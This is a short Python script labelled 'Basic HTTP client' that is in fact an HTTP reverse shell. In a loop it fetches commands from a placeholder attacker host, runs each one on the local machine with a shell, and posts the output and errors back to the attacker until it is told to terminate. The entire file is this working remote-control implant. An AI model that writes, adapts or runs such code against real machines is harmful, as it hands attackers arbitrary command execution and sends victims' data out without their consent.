#By Salah Baddou

#Basic HTTP client


import requests    
import subprocess 
import time


while True: 

    req = requests.get('http://#ip_of_the_attacker_machine')   
    command = req.text                             
        
    if 'terminate' in command:
        break 

    else:
        CMD =  subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        post_response = requests.post(url='http:/#ip_of_the_attacker_machine', data=CMD.stdout.read() )
        post_response = requests.post(url='http:/#ip_of_the_attacker_machine', data=CMD.stderr.read() ) 
    time.sleep(3)
    



